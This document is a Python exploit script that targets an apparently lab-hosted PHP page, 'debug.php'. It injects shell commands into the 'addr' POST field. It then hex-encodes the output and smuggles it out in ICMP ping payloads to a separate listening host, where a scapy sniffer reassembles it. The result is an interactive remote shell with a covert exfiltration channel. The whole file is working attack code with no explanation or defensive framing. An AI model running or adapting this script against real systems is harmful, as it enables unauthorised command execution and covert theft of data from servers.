#!/usr/bin/python

from __future__ import print_function
import threading
import requests
import urllib
import sys
from scapy.all import *

TARGET_IP = '192.168.80.131'
INJECTION_ADDR = '; OUT=`{} 2>&1 | xxd -c 2 -p`; for i in $OUT; do ping -c 1 -p $i 192.168.80.135; done;'

def is_cmd_response(packet):
	'''
	This function is the callback function for get_pings() and it checks whether the packet
	is a ping request and that it is from our target and if so, it returns the output of our command.
	:param scapy.Packet packet: The packet we caught in get_pings().
	:return: The output of our command.
	:rtype: str
	'''
	if str(packet.getlayer(ICMP).type) == "8" and str(packet.getlayer(IP).src) == TARGET_IP: 
		print(str(packet.getlayer(ICMP).payload)[8:10], end="")

def get_pings():
	'''
	This function is in charge of getting all of the output of our commands.
	It does so by sniffing all ICMP pings and looking for the ones from the targets IP.
	'''
	sniff(prn=is_cmd_response, filter="icmp", store=0)

def main():
	'''
	Our programs main function.
	'''
	t = threading.Thread(target=get_pings)
	t.daemon=True
	t.start() # Sniff for responses.
	while True:
		cmd = raw_input('')
		if cmd is not '':
			if cmd == 'exit':
				sys.exit()

			encoded_cmd = INJECTION_ADDR.format(cmd)
			data = {'addr': encoded_cmd}
			requests.post('http://{}/debug.php'.format(TARGET_IP), data=data)

if __name__ == '__main__':
	main()